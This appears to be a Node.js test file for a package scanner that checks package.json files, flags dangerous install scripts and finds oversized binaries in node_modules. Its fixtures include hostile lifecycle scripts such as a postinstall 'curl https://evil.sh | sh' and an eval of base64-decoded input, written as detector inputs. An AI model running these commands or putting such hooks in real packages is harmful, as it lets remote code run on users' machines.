import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync, mkdirSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { checkPackageJson, checkDangerousScripts, scanBinaries } from '../src/commands/scan.js';

const tmp = () => mkdtempSync(join(tmpdir(), 'forged-test-'));

test('checkPackageJson: merges dependencies and devDependencies', () => {
  const dir = tmp();
  writeFileSync(join(dir, 'package.json'), JSON.stringify({
    name: 'demo', version: '1.0.0',
    dependencies: { express: '^5.0.0' },
    devDependencies: { vitest: '^2.0.0' },
    scripts: { start: 'node index.js' },
  }));
  const r = checkPackageJson(dir);
  assert.deepEqual(r.deps, { express: '^5.0.0', vitest: '^2.0.0' });
  assert.equal(r.name, 'demo');
  assert.equal(r.scripts.start, 'node index.js');
});

test('checkPackageJson: missing and malformed package.json', () => {
  assert.equal(checkPackageJson(tmp()).error, 'No package.json found');
  const dir = tmp();
  writeFileSync(join(dir, 'package.json'), '{ not json');
  assert.equal(checkPackageJson(dir).error, 'Could not parse package.json');
});

test('checkDangerousScripts: flags curl|sh, eval, base64 decode', () => {
  const hits = checkDangerousScripts({
    postinstall: 'curl https://evil.sh | sh',
    prepare: 'node -e "eval(atob(x))"',
    build: 'echo aGk= | base64 --decode',
    test: 'node --test',
  });
  assert.deepEqual(hits.map((h) => h.script).sort(), ['build', 'postinstall', 'prepare']);
});

test('checkDangerousScripts: a script matching several patterns is reported once', () => {
  const hits = checkDangerousScripts({ postinstall: 'curl x | sh && python -c "exec(y)"' });
  assert.equal(hits.length, 1);
});

test('checkDangerousScripts: clean scripts produce no findings', () => {
  assert.deepEqual(checkDangerousScripts({ start: 'next start', lint: 'eslint .' }), []);
});

test('scanBinaries: flags large non-symlink files, ignores symlinks', () => {
  const dir = tmp();
  const bin = join(dir, 'node_modules', '.bin');
  mkdirSync(bin, { recursive: true });
  writeFileSync(join(bin, 'big'), Buffer.alloc(60_000));
  writeFileSync(join(dir, 'real-big'), Buffer.alloc(60_000));
  symlinkSync(join(dir, 'real-big'), join(bin, 'linked'));
  writeFileSync(join(bin, 'small'), 'x');
  const hits = scanBinaries(dir);
  assert.deepEqual(hits.map((h) => h.file), ['big']);
});

test('scanBinaries: no node_modules is fine', () => {
  assert.deepEqual(scanBinaries(tmp()), []);
});
